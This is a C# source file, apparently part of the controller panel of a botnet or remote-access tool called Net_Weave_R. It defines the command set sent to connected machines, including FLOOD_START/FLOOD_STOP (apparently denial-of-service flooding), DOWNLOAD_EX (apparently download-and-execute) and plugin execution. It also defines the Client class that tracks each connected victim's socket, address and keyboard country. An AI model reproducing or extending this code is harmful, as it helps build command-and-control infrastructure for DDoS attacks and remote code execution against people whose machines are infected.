using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using NetLib.API;
using NetLib.Networking;
using System.Windows.Forms;
using System.Threading;
using System.ComponentModel;
namespace Net_Weave_R.Core
{
    public enum PacketHeader : int
    {
        NONE = 0xF,
        PASSWORD = 0xFF,
        PASSWORD_ACCEPT = 0xFFF,
        PASSWORD_DENIED = 0xFFFF,
        LIMIT = 0xFFFFF,
        CONFIRM = 0xFFFFFF,
        INFORMATION = 0x0,
        FLOOD_START = 0x1,
        FLOOD_STOP = 0x2,
        STATUS = 0x3,
        DOWNLOAD_EX = 0x4,
        UNINSTALL = 0x5,
        PLUGIN_STORE = 0x6,
        PLUGIN_EXECUTE = 0x7,
        PLUGIN_DATA = 0x8,
        PLUGIN_GET = 0x9,
        PLUGIN_REMOVE = 0x10,
        PLUGIN_ERROR = 0x11,
        PLUGIN_STATUS = 0x12,
        SPEED = 0x13
    }
    public class Client
    {
        SOCKET socket;
        public SOCKET Socket
        {
            get
            {
                return socket;
            }
        }
        ListViewItem lvi;
        Thread t;
        public ListViewItem Lvi
        {
            get
            {
                return lvi;
            }
        }
        public string Address
        {
            get;
            private set;
        }
        public string UID
        {
            get;
            private set;
        }
        public string KeyboardCountry
        {
            get;
            set;
        }
        bool disNote;
        public bool DisconnectNotify
        {
            get { return disNote; }
            set { disNote = value; }
        }
        bool fullCon;
        public bool FullyConnected
        {
            get { return fullCon; }
            set { fullCon = value; }
        }
        bool pinged;
        public bool Pinged
        {
            get { return pinged; }
            set { pinged = value; }
        }

        bool alive;
        public bool Alive
        {
            get { return alive; }
            set { alive = value; }
        }

        int lastSent;
        public Client(SOCKET sck)
        {
            socket = sck;
            Address = sck.Address.ToString().Split(':')[0];
            lvi = new ListViewItem();
            lvi.Text = Address;
            lvi.Tag = this;
            UID = Guid.NewGuid().ToString();
            disNote = true;
            fullCon = false;
            pinged = false;
            alive = false;
            lastSent = 0;
        }

        public void BeginRead()
        {
            t = new Thread(() =>
                {
                    while (true)
                    {
                        byte[] data = socket.Receive();

                        if (data.Length == 0)
                        {
                            break;
                        }

                        if (DataReceived != null)
                        {
                            DataReceived(this, new DataReceivedEventArgs(data));
                        }
                    }

                    if (Disconnected != null)
                    {
                        Disconnected(this);
                    }
                });
            t.Start();
        }

        public void Close()
        {
            if (t != null)
                t.Abort();
            socket.Close();
            Dispose();
        }

        public void Dispose()
        {
            socket = null;
            Address = null;
            UID = null;
            lvi = null;
            t = null;
            KeyboardCountry = null;
        }

        public void Send(byte[] data)
        {
            new Thread(() =>
                {
                    int sent = socket.Send(data);
                    lastSent = sent;
                    onSend(sent);
                }).Start();
        }
        void onSend(int sent)
        {
            if (sent > 0)
                if (DataSent != null)
                    DataSent(this, new DataSentEventArgs(sent));
        }

        public void SendPing()
        {
            PacketWriter w = new PacketWriter();
            w.Write((int)PacketHeader.CONFIRM);
            Send(w.ToArray(true));
            Pinged = true;
        }

        public void RaiseDisconnected()
        {
            if (Disconnected != null)
                Disconnected(this);
        }
        #region GUI Methods
        public void SetStatus(string status)
        {
            Lvi.ListView.Invoke((MethodInvoker)delegate
            {
                Lvi.SubItems[3].Text = status;
            });
        }
        #endregion
        #region Events
        public event EventHandler<DataReceivedEventArgs> DataReceived;
        public event EventHandler<DataSentEventArgs> DataSent;

        public delegate void DisconnectedEventHandler(Client e);
        public event DisconnectedEventHandler Disconnected;
        #endregion
    }
}
